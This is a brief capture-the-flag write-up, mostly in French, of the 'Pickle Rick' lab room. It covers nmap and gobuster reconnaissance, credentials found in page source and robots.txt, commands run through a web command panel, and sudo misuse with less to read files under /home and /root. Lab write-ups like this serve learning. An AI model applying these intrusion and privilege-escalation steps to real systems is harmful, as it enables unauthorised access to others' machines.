# Room - Pickle Rick

## nmap -A 10.10.243.195

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-28 20:02 UTC
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:03 (0:00:06 remaining)
Nmap scan report for ip-10-10-243-195.eu-west-1.compute.internal (10.10.243.195)
Host is up (0.00045s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f957db1acd70e69ab1d6c2a5b296f29a (RSA)
|   256 208d02c08b3cc5277ca8e5582c2ef4ca (ECDSA)
|_  256 820461488cca45995434707b29ff881d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:7D:F0:49:9D:6D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/28%OT=22%CT=1%CU=42837%PV=Y%DS=1%DC=D%G=Y%M=027DF0%
OS:TM=6770597B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=
OS:I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11
OS:NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=
OS:F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms ip-10-10-243-195.eu-west-1.compute.internal (10.10.243.195)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.56 seconds
```

## curl http://10.10.243.195

```bash
Note to self, remember username!

    Username: R1ckRul3s
```

## Gobuster

```bash
gobuster dir -u http://10.10.243.195 -w /usr/share/wordlists/dirb/common.txt
```

### Accès à la page /robots.txt

Wubbalubbadubdub : Mot de passe ?

### Page /login.php découverte

Connexion avec les identifiants ci-dessus fonctionnelle --> accès au site.

### Sur le command panel teste de la commande 'ls'

```bash
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

On a le premier ingrédient !

On ne peut pas ouvrir le fichier avec `cat` mais avec `less` c'est possible.

Si ensuite on fait un `less clue.txt` on obtient cet indice :

"Look around the file system for the other ingredient."

### On teste un sudo -l

```bash
Matching Defaults entries for www-data on ip-10-10-243-195:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-243-195:
    (ALL) NOPASSWD: ALL
```

On cherche alors dans la machine jusqu'à :

```bash
less ../../../home/rick/"second ingredients"
```

Le deuxième ingrédient est là !

Pour le dernier on va chercher le répertoire root et après quelques recherches, on tombe sur :

```bash
"sudo less ../../../root/3rd.txt"
```

On obtient finalement le dernier ingrédient !